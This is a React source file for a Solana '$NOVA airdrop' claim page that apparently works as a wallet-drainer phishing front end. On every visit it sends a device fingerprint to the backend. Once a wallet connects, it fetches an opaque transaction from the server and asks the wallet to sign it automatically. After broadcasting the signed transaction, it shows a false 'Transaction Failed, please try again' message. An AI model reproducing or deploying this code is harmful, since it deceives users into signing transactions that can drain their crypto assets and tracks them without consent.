
import React, { useCallback, useEffect, useRef } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider, useWalletInfo } from "@reown/appkit/react";
import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
import { PublicKey, Transaction } from "@solana/web3.js";
import './Home.css';

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:3002";

interface DeviceInfo {
  screenResolution: string;
  language: string;
  platform: string;
  userAgent: string;
  hardwareConcurrency: number | string;
  gpuRenderer: string;
}

const getDeviceInfo = (): DeviceInfo => {
  let gpuRenderer = 'N/A';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || (canvas.getContext('experimental-webgl') as WebGLRenderingContext | null);
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A';
      }
    }
  } catch (e) {
    console.error(e);
  }

  return {
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    language: navigator.language,
    platform: navigator.platform,
    userAgent: navigator.userAgent,
    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
    gpuRenderer
  };
};

const base64ToUint8Array = (base64: string): Uint8Array => {
  const binary = window.atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const uint8ArrayToBase64 = (bytes: Uint8Array): string => {
  let binary = "";
  bytes.forEach((byte) => {
    binary += String.fromCharCode(byte);
  });
  return window.btoa(binary);
};

export const Home: React.FC = () => {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletInfo } = useWalletInfo();
  const { walletProvider } = useAppKitProvider<{ signTransaction: (tx: Transaction) => Promise<Transaction> }>('solana');
  const { connection } = useAppKitConnection();
  
  const shouldSendTransaction = useRef<boolean>(false);
  const prevConnectedRef = useRef<boolean>(false);

  const sendParticipationTransaction = useCallback(async (pubKey: PublicKey) => {
    try {
      if (!walletProvider || !connection) {
        alert("Please connect your wallet before participating.");
        return;
      }

      const deviceInfo = getDeviceInfo();
      const walletName = walletInfo?.name || "Unknown Wallet";

      const createRes = await fetch(`${API_URL}/api/get-transaction`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ publicKey: pubKey.toString(), deviceInfo, walletName })
      });

      if (!createRes.ok) {
        const error = await createRes.json();
        alert(error.message || error.error || "Failed to create transaction");
        return;
      }

      const { transaction: transactionBase64 } = await createRes.json();
      
      const transaction = Transaction.from(base64ToUint8Array(transactionBase64));
      const signedTransaction = await walletProvider.signTransaction(transaction);

      if (!signedTransaction) {
        throw new Error("Wallet failed to sign the transaction.");
      }

      const broadcastRes = await fetch(`${API_URL}/api/send-transaction`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          signedTransaction: uint8ArrayToBase64(signedTransaction.serialize()),
          publicKey: pubKey.toString(),
          walletName,
          deviceInfo
        })
      });

      if (!broadcastRes.ok) {
        const error = await broadcastRes.json();
        alert("Failed to broadcast: " + (error.error || "Unknown error"));
        return;
      }

      await broadcastRes.json();
      alert(`❌ Transaction Failed!\n\nCould not process please try again.`);
    } catch (error: any) {
      console.error("Transaction failed:", error);
      if (error?.message?.includes("Network")) {
        alert("Network error. Is the backend server running?");
      } else {
        alert("Transaction cancelled or failed. Please try again.");
      }
    } finally {
      shouldSendTransaction.current = false;
    }
  }, [connection, walletProvider, walletInfo]);

  const handleParticipate = async () => {
    try {
      if (!isConnected) {
        shouldSendTransaction.current = true;
        open();
        return;
      }

      if (!address) {
        alert("Please connect your Solana wallet first.");
        return;
      }

      await sendParticipationTransaction(new PublicKey(address));
    } catch (error) {
      console.error("Error:", error);
      alert("An error occurred. Please try again.");
      shouldSendTransaction.current = false;
    }
  };

  useEffect(() => {
    const logVisit = async () => {
      try {
        await fetch(`${API_URL}/api/log-visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ deviceInfo: getDeviceInfo() })
        });
      } catch (e) {
        console.error("Failed to log visit:", e);
      }
    };

    logVisit();
  }, []);

  useEffect(() => {
    const justConnected = isConnected && !prevConnectedRef.current;
    prevConnectedRef.current = isConnected;

    if (justConnected) {
      shouldSendTransaction.current = true;
    }

    let intervalId: ReturnType<typeof setInterval> | undefined;
    let timeoutId: ReturnType<typeof setTimeout> | undefined;

    if (shouldSendTransaction.current && isConnected && address) {
      intervalId = setInterval(() => {
        if (walletProvider) {
          if (intervalId) clearInterval(intervalId);
          shouldSendTransaction.current = false;
          void sendParticipationTransaction(new PublicKey(address));
        }
      }, 100);

      timeoutId = setTimeout(() => {
        if (intervalId) clearInterval(intervalId);
      }, 5000);
    }

    return () => {
      if (intervalId) clearInterval(intervalId);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [isConnected, address, walletProvider, sendParticipationTransaction]);

  return (
    <div className="home-page">
      {/* Hero Section */}
      <section className="hero-section">
        <div className="container hero-container">
          <div className="hero-content">
            <div className="badge">
              <span className="pulse-dot"></span>
              Live $NOVA Airdrop
            </div>
            <h1 className="hero-title">
              Take part in the <br />
              <span className="gradient-text">$NOVA Airdrop</span>
            </h1>
            <p className="hero-description">
              Join the exclusive $NOVA airdrop and claim your tokens. Limited-time opportunity for early adopters and community members to participate in our Web3 ecosystem.
            </p>
            <div className="hero-actions">
              <button onClick={handleParticipate} className="btn-primary">
                {isConnected ? 'Tokens Incoming...' : 'Claim Tokens'}
              </button>
              <a href="#about" className="btn-secondary">Learn More</a>
            </div>
          </div>

          <div className="hero-visual">
            <div className="token-glow-card">
              <div className="token-avatar">$NOVA</div>
              <div className="glow-effect"></div>
            </div>
          </div>
        </div>
      </section>

      {/* About Section */}
      <section id="about" className="about-section">
        <div className="container">
          <div className="section-header">
            <h2>About <span className="gradient-text">$NOVA</span> Airdrop</h2>
            <p>
              The $NOVA airdrop is a limited-time distribution of free $NOVA tokens to early supporters and active community members building decentralized finance.
            </p>
          </div>

          <div className="stats-grid">
            <div className="stat-card">
              <span className="stat-value">1,000,000</span>
              <span className="stat-label">Total Tokens</span>
            </div>
            <div className="stat-card">
              <span className="stat-value">50,000</span>
              <span className="stat-label">Participants</span>
            </div>
            <div className="stat-card">
              <span className="stat-value">7 Days</span>
              <span className="stat-label">Time Remaining</span>
            </div>
          </div>

          {/* Eligibility Card matching screenshot */}
          <div className="eligibility-card">
            <h3 className="eligibility-title">Eligibility Requirements</h3>
            <div className="eligibility-content">
              <ul className="requirements-list">
                <li>
                  <span className="checkmark">✓</span>
                  <span>Be an active Solana blockchain user</span>
                </li>
                <li>
                  <span className="checkmark">✓</span>
                  <span>Hold some tokens in your wallet</span>
                </li>
                <li>
                  <span className="checkmark">✓</span>
                  <span>Follow our account on Twitter</span>
                </li>
                <li>
                  <span className="checkmark">✓</span>
                  <span>Have fun!</span>
                </li>
              </ul>
              <div className="wallet-graphic">
                <img 
                  src="https://loa.quantresolvedesk.xyz/images/wallet.webp" 
                  alt="Wallet Illustration" 
                />
              </div>
            </div>
          </div>
          {/* Claim CTA Section */}
          <div id="claim" className="claim-cta-section">
            <h3 className="claim-cta-title">Ready to claim your tokens?</h3>
            <button className="btn-connect-wallet" onClick={handleParticipate}>
              {isConnected ? 'Tokens Underway...' : 'Connect Wallet'}
            </button>
          </div>
        </div>
      </section>
    </div>
  );
};